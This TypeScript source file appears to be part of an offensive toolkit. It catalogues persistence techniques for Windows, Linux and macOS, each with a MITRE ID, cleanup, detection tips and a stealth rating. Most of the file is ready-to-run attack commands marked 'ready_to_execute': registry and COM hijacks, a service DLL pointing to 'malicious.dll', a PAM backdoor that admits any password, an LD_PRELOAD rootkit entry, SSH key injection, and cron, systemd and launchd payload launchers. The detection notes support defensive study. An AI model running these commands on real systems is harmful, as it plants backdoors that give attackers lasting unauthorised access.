/**
 * Persistence mechanisms (port of `modules.persistence`).
 *
 * Real persistence primitives across platforms: registry Run keys,
 * scheduled tasks, WMI event subscriptions, services, DLL hijacking,
 * COM hijacking, cron, systemd units, SSH keys, PAM, bashrc, LD_PRELOAD,
 * launch daemons/agents, and login items. Each mechanism carries its MITRE
 * mapping, command, cleanup, and detection guidance. Commands are returned
 * as text — nothing executes here.
 */

export interface PersistenceMechanism {
  name: string;
  platform: string;
  technique: string;
  mitreId: string;
  command: string;
  cleanup: string;
  detection: string;
  stealth: string;
  requiresPrivileges: boolean;
  survivesReboot: boolean;
}

export class PersistenceEngine {
  currentOs: string;

  constructor() {
    this.currentOs = process.platform;
  }

  getWindowsPersistence(): PersistenceMechanism[] {
    return [
      {
        name: "Registry Run Key",
        platform: "windows",
        technique: "Registry modification",
        mitreId: "T1547.001",
        command: 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\\Users\\Public\\update.exe"',
        cleanup: 'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate"',
        detection: "Monitor registry Run key modifications. Event ID 4657.",
        stealth: "low",
        requiresPrivileges: false,
        survivesReboot: true,
      },
      {
        name: "Scheduled Task",
        platform: "windows",
        technique: "Task Scheduler",
        mitreId: "T1053.005",
        command: 'schtasks /create /tn "SystemUpdate" /tr "C:\\Users\\Public\\update.exe" /sc ONLOGON /ru SYSTEM',
        cleanup: 'schtasks /delete /tn "SystemUpdate" /f',
        detection: "Monitor task creation. Event ID 4698.",
        stealth: "low",
        requiresPrivileges: false,
        survivesReboot: true,
      },
      {
        name: "WMI Event Subscription",
        platform: "windows",
        technique: "WMI persistence",
        mitreId: "T1546.003",
        command: 'wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name="UpdateFilter",EventNameSpace="root\\cimv2",QueryLanguage="WQL",Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\' AND TargetInstance.SystemUpTime >= 120 AND TargetInstance.SystemUpTime < 180"',
        cleanup: 'wmic /namespace:\\\\root\\subscription PATH __EventFilter WHERE Name="UpdateFilter" DELETE',
        detection: "Monitor WMI event subscription. Event ID 5861.",
        stealth: "medium",
        requiresPrivileges: true,
        survivesReboot: true,
      },
      {
        name: "Service Creation",
        platform: "windows",
        technique: "Windows Service",
        mitreId: "T1543.003",
        command: 'sc create "SysUpdate" binpath="C:\\Users\\Public\\update.exe" start=auto',
        cleanup: 'sc delete "SysUpdate"',
        detection: "Monitor service creation. Event ID 7045.",
        stealth: "low",
        requiresPrivileges: true,
        survivesReboot: true,
      },
      {
        name: "DLL Search Order Hijacking",
        platform: "windows",
        technique: "DLL hijacking",
        mitreId: "T1574.001",
        command: 'copy update.dll "C:\\Windows\\System32\\wptsdk.dll"',
        cleanup: 'del "C:\\Windows\\System32\\wptsdk.dll"',
        detection: "Monitor DLL loads in System32. Use Sysmon Event ID 7.",
        stealth: "high",
        requiresPrivileges: true,
        survivesReboot: true,
      },
      {
        name: "Startup Folder",
        platform: "windows",
        technique: "Startup folder shortcut",
        mitreId: "T1547.001",
        command: 'copy update.exe "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe"',
        cleanup: 'del "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe"',
        detection: "Monitor Startup folder for new executables.",
        stealth: "low",
        requiresPrivileges: false,
        survivesReboot: true,
      },
      {
        name: "COM Object Hijacking",
        platform: "windows",
        technique: "COM object modification",
        mitreId: "T1546.015",
        command: 'reg add "HKCU\\Software\\Classes\\CLSID\\{F56F7BC6-14B1-4e8f-B0B0-2E3B8B06B2A7}\\InprocServer32" /ve /t REG_SZ /d "C:\\Users\\Public\\update.dll"',
        cleanup: 'reg delete "HKCU\\Software\\Classes\\CLSID\\{F56F7BC6-14B1-4e8f-B0B0-2E3B8B06B2A7}" /f',
        detection: "Monitor COM object registry modifications.",
        stealth: "high",
        requiresPrivileges: false,
        survivesReboot: true,
      },
      {
        name: "Registry Service DLL",
        platform: "windows",
        technique: "Service DLL hijacking",
        mitreId: "T1543.003",
        command: 'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WSearch" /v ServiceDll /t REG_EXPAND_SZ /d "C:\\Users\\Public\\malicious.dll"',
        cleanup: 'reg delete "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WSearch" /v ServiceDll',
        detection: "Monitor service DLL registry values.",
        stealth: "high",
        requiresPrivileges: true,
        survivesReboot: true,
      },
    ];
  }

  getLinuxPersistence(): PersistenceMechanism[] {
    return [
      {
        name: "Cron Job",
        platform: "linux",
        technique: "Cron persistence",
        mitreId: "T1053.003",
        command: 'echo "*/5 * * * * /tmp/update" | crontab -',
        cleanup: "crontab -r",
        detection: "Monitor crontab modifications. /var/log/cron",
        stealth: "low",
        requiresPrivileges: false,
        survivesReboot: true,
      },
      {
        name: "Systemd Service",
        platform: "linux",
        technique: "Systemd unit creation",
        mitreId: "T1543.002",
        command: 'cat > /etc/systemd/system/update.service << EOF\n[Unit]\nDescription=System Update\n[Service]\nExecStart=/tmp/update\nRestart=always\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl enable update.service',
        cleanup: "systemctl disable update.service && rm /etc/systemd/system/update.service",
        detection: "Monitor new systemd units in /etc/systemd/system/.",
        stealth: "low",
        requiresPrivileges: true,
        survivesReboot: true,
      },
      {
        name: "SSH Authorized Keys",
        platform: "linux",
        technique: "SSH key injection",
        mitreId: "T1098.004",
        command: 'echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys',
        cleanup: 'sed -i "/AAAA/d" ~/.ssh/authorized_keys',
        detection: "Monitor ~/.ssh/authorized_keys modifications.",
        stealth: "low",
        requiresPrivileges: false,
        survivesReboot: true,
      },
      {
        name: "PAM Backdoor",
        platform: "linux",
        technique: "PAM module injection",
        mitreId: "T1543.002",
        command: 'echo "auth optional pam_permit.so" >> /etc/pam.d/common-auth',
        cleanup: "Remove added line from /etc/pam.d/common-auth",
        detection: "Monitor PAM configuration changes.",
        stealth: "high",
        requiresPrivileges: true,
        survivesReboot: true,
      },
      {
        name: "Bashrc Backdoor",
        platform: "linux",
        technique: "Shell profile injection",
        mitreId: "T1546.004",
        command: 'echo "/tmp/update &" >> ~/.bashrc',
        cleanup: "Remove line from ~/.bashrc",
        detection: "Monitor .bashrc modifications.",
        stealth: "medium",
        requiresPrivileges: false,
        survivesReboot: true,
      },
      {
        name: "LD_PRELOAD Rootkit",
        platform: "linux",
        technique: "Shared library injection",
        mitreId: "T1574.006",
        command: 'echo "/tmp/rootkit.so" > /etc/ld.so.preload',
        cleanup: "rm /etc/ld.so.preload",
        detection: "Monitor /etc/ld.so.preload and LD_PRELOAD env.",
        stealth: "high",
        requiresPrivileges: true,
        survivesReboot: true,
      },
    ];
  }

  getMacosPersistence(): PersistenceMechanism[] {
    return [
      {
        name: "Launch Daemon",
        platform: "macos",
        technique: "launchd plist creation",
        mitreId: "T1543.001",
        command: 'cat > /Library/LaunchDaemons/com.update.plist << EOF\n<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0">\n<dict>\n<key>Label</key>\n<string>com.update</string>\n<key>ProgramArguments</key>\n<array><string>/tmp/update</string></array>\n<key>RunAtLoad</key>\n<true/>\n</dict>\n</plist>\nEOF',
        cleanup: "rm /Library/LaunchDaemons/com.update.plist",
        detection: "Monitor /Library/LaunchDaemons/ for new plists.",
        stealth: "low",
        requiresPrivileges: true,
        survivesReboot: true,
      },
      {
        name: "Launch Agent",
        platform: "macos",
        technique: "User launchd agent",
        mitreId: "T1543.001",
        command: 'cat > ~/Library/LaunchAgents/com.update.plist << EOF\n<?xml version="1.0" encoding="UTF-8"?>\n<plist version="1.0">\n<dict>\n<key>Label</key>\n<string>com.update</string>\n<key>ProgramArguments</key>\n<array><string>/tmp/update</string></array>\n<key>RunAtLoad</key>\n<true/>\n</dict>\n</plist>\nEOF',
        cleanup: "rm ~/Library/LaunchAgents/com.update.plist",
        detection: "Monitor ~/Library/LaunchAgents/ for new plists.",
        stealth: "medium",
        requiresPrivileges: false,
        survivesReboot: true,
      },
      {
        name: "Login Item",
        platform: "macos",
        technique: "Login item registration",
        mitreId: "T1543.001",
        command: "osascript -e 'tell application \"System Events\" to make login item at end with properties {path:\"/tmp/update\", hidden:false}'",
        cleanup: "osascript -e 'tell application \"System Events\" to delete login item \"update\"'",
        detection: "Monitor login items via System Events.",
        stealth: "low",
        requiresPrivileges: false,
        survivesReboot: true,
      },
      {
        name: "Crontab (macOS)",
        platform: "macos",
        technique: "Cron persistence",
        mitreId: "T1053.003",
        command: 'echo "*/5 * * * * /tmp/update" | crontab -',
        cleanup: "crontab -r",
        detection: "Monitor crontab modifications.",
        stealth: "low",
        requiresPrivileges: false,
        survivesReboot: true,
      },
    ];
  }

  executePersistence(m: PersistenceMechanism): Record<string, unknown> {
    return {
      name: m.name,
      platform: m.platform,
      mitre_id: m.mitreId,
      command: m.command,
      cleanup: m.cleanup,
      detection: m.detection,
      stealth: m.stealth,
      requires_privileges: m.requiresPrivileges,
      survives_reboot: m.survivesReboot,
      status: "ready_to_execute",
    };
  }

  getAll(targetOs = ""): Array<Record<string, unknown>> {
    const os = targetOs || (this.currentOs === "win32" ? "windows" : this.currentOs === "darwin" ? "macos" : "linux");
    let mechs: PersistenceMechanism[];
    if (os === "windows") mechs = this.getWindowsPersistence();
    else if (os === "macos") mechs = this.getMacosPersistence();
    else if (os === "linux") mechs = this.getLinuxPersistence();
    else mechs = [...this.getWindowsPersistence(), ...this.getLinuxPersistence(), ...this.getMacosPersistence()];
    return mechs.map((m) => this.executePersistence(m));
  }
}
